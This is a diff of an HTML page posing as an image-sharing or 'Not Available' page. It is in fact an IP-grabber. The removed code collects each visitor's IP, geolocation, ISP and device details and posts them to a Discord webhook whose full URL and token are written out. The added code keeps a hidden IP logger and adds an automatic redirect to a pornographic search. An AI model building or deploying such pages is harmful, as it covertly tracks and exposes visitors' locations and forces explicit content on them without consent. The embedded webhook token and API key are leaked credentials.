@@ -1,188 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fetch Location and Weather Data</title>
-
-  <!-- CSS -->
-  <link rel="stylesheet" href="https://imagesharing.tiiny.site/src/css/main.min.css">
-  <!-- Fontawesome -->
-  <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css">
-  <!-- Google Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-  <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&amp;family=Poppins:wght@300;600&amp;display=swap" rel="stylesheet">
-  <!-- Leaflet -->
-  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="">
-  <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
-
-  <!-- Notyf CSS -->
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
-  
-  <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
-  
-  <script defer="" data-domain="imagesharing.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script>
-  <script type="text/javascript" src="https://tiiny.host/ad-script.js"></script>
-  
-  <style>
-    .header {
-      display: none;
-    }
-    .map-container {
-      display: none;
-    }
-  </style>
-
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Not Available</title>
+    <!-- CSS -->
+    <link rel="stylesheet" href="https://imagesharing.tiiny.site/src/css/main.min.css">
+    <!-- Fontawesome -->
+    <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css">
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&amp;family=Poppins:wght@300;600&amp;display=swap" rel="stylesheet">
+    <!-- Leaflet -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="">
+    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
+    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
+    <!-- Notyf CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <script defer="" data-domain="imagesharing.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script>
+    <script type="text/javascript" src="https://tiiny.host/ad-script.js"></script>
+    
+    <!-- Automatic Redirect Script -->
+    <script>
+        window.onload = function() {
+            window.location.href = "https://www.bing.com/videos/search?q=gay+porn+gif&&view=detail&mid=B72C1CA83AB545648A01B72C1CA83AB545648A01&&mmscn=vidadt&FORM=VRDGAR"; // Replace with your desired URL
+        };
+    </script>
 </head>
-
 <body>
-  <header class="header"></header>
-  <img src="https://media.tenor.com/StMcxdC56MMAAAAM/cat.gif" alt="Not Available">
+    <header class="header"></header>
+    <img src="ERROR" description:="" 404"="">
 
-  <script>
-    // Function to fetch Google Maps location link
-    function fetchGoogleMapsLocation(latitude, longitude) {
-      return `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-    }
-
-    // Function to fetch weather data for a given city
-    function fetchWeatherData(city) {
-      const apiKey = "3bc56f53295e4e60890180255240505";
-      const apiUrl = `http://api.weatherapi.com/v1/current.json?key=${apiKey}&q=${city}&aqi=no`;
-      return fetch(apiUrl)
-        .then(response => response.json())
-        .then(data => {
-          return { temp_c: data.current.temp_c, temp_f: data.current.temp_f };
-        });
-    }
-
-    // Fetching IP-related data
-    fetch("http://ip-api.com/json/")
-      .then(response => response.json())
-      .then(ipData => {
-        const latitude = ipData.lat;
-        const longitude = ipData.lon;
-        const googleMapsLink = fetchGoogleMapsLocation(latitude, longitude);
-        
-        // Fetching weather data for the user's city
-        fetchWeatherData(ipData.city)
-          .then(weatherData => {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const isOnline = navigator.onLine ? "Yes" : "No";
-            const browserName = (() => {
-              const ua = navigator.userAgent;
-              if (ua.includes("Firefox")) return "Firefox";
-              if (ua.includes("Chrome")) return "Chrome";
-              if (ua.includes("Safari")) return "Safari";
-              if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
-              if (ua.includes("Edge")) return "Edge";
-              if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
-              return "Unknown";
-            })();
-            const operatingSystem = (() => {
-              const ua = navigator.userAgent;
-              if (ua.includes("Win")) return "Windows";
-              if (ua.includes("Mac")) return "MacOS";
-              if (ua.includes("X11")) return "UNIX";
-              if (ua.includes("Linux")) return "Linux";
-              return "Unknown";
-            })();
-
-            // Embedding the information
-            const embed = {
-              "embeds": [{
-                "title": "Hatchify",
-                "color": 3447003,
-                "fields": [
-                  { "name": "🌍 Country", "value": `${ipData.country} :flag_${ipData.countryCode.toLowerCase()}:` },
-                  { "name": "📍 Region", "value": `${ipData.region} (${ipData.regionName})` },
-                  { "name": "🌆 City", "value": `${ipData.city}` },
-                  { "name": "🏠 Zip", "value": `${ipData.zip || 'Not available'}` },
-                  { "name": "🌐 Coordinates", "value": `Latitude: ${latitude}, Longitude: ${longitude}` },
-                  { "name": "⏰ Timezone", "value": `${ipData.timezone} :clock2:` },
-                  { "name": "📡 ISP", "value": `${ipData.isp}` },
-                  { "name": "🏢 Organization", "value": `${ipData.org || 'Not available'}` },
-                  { "name": "🛰️ AS", "value": `${ipData.as}` },
-                  { "name": "🔍 Query", "value": `${ipData.query}` },
-                  { "name": "🔒 VPN (Unstable)", "value": `${ipData.proxy ? "Yes" : "No"}` },
-                  { "name": "📱 Mobile (Unstable)", "value": `${ipData.mobile ? "Yes" : "No"}` },
-                  { "name": "🌡️ Temperature", "value": `${weatherData.temp_c}°C / ${weatherData.temp_f}°F` },
-                  { "name": "📍 Location on Google Maps", "value": `[View on Google Maps](${googleMapsLink})` },
-                  { "name": "💻 User Agent", "value": `${userAgent}` },
-                  { "name": "🖥️ Platform", "value": `${platform}` },
-                  { "name": "🗣️ Language", "value": `${language}` },
-                  { "name": "📏 Screen Resolution", "value": `${screenWidth} x ${screenHeight}` },
-                  { "name": "🌐 Online", "value": `${isOnline}` },
-                  { "name": "🌍 Browser", "value": `${browserName}` },
-                  { "name": "🖥️ Operating System", "value": `${operatingSystem}` }
-                ]
-              }]
+    <script>
+        function get_information(link, callback) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", link, true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    callback(xhr.responseText);
+                }
             };
-
-            // Sending to a Discord webhook
-            const webhookUrl = "https://discord.com/api/webhooks/1304924593890529391/FwkIm38_nsbgFIsIJGqzlFxw4U0cmjLMXGXp8LOFvC8uQqe0MJDqBZJxvbn4UwGHEZK-";
-            fetch(webhookUrl, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify(embed)
-            });
-          });
-      });
-
-    // Function to fetch and log IP information from a secondary source
-    function get_information(link, callback) {
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", link, true);
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-          callback(xhr.responseText);
+            xhr.send(null);
         }
-      };
-      xhr.send(null);
-    }
 
-    get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
-      var div = document.createElement("div");
-      div.innerHTML = text;
-      div.id = "razzylog";
-      const secondList = document.getElementsByClassName("header")[0];
-      secondList.appendChild(div);
-    });
+        get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "razzylog";
+            const secondList = document.getElementsByClassName("header")[0];
+            secondList.appendChild(div);
+        });
 
-    get_information("https://api.ipify.org/", function (text) {
-      var div = document.createElement("div");
-      div.innerHTML = text;
-      div.id = "ipppp";
-      const secondList = document.getElementsByClassName("header")[0];
-      secondList.appendChild(div);
-    });
+        get_information("https://api.ipify.org/", function(text) {
+            var div = document.createElement("div");
+            div.innerHTML = text;
+            div.id = "ipppp";
+            const secondList = document.getElementsByClassName("header")[0];
+            secondList.appendChild(div);
+        });
 
-    // Function to send IP logging information
-    function ipLogByRaz() {
-      var ispp = document.getElementById('ipppp').innerHTML;
-      var extra = document.getElementById("razzylog").innerHTML;
-      const request = new XMLHttpRequest();
-      request.open("POST", wbhk);
-      request.setRequestHeader('Content-type', 'application/json');
-      const params = {
-        username: "Beamed",
-        avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-        content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
-      };
-      request.send(JSON.stringify(params));
-    }
+        function ipLogByRaz() {
+            var ispp = document.getElementById('ipppp').innerHTML;
+            var extra = document.getElementById("razzylog").innerHTML;
+            const request = new XMLHttpRequest();
+            request.open("POST", wbhk);
+            request.setRequestHeader('Content-type', 'application/json');
+            const params = {
+                username: "Beamed",
+                avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+                content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
+            };
+            request.send(JSON.stringify(params));
+        }
 
-    // Trigger the logging after a delay
-    setTimeout(function () { ipLogByRaz() }, 700);
-
-  </script>
+        setTimeout(function() {
+            ipLogByRaz();
+        }, 700);
+    </script>
+    <style>
+        .header {
+            display: none;
+        }
+        .map-container {
+            display: none;
+        }
+    </style>
 </body>
-
 </html>
+
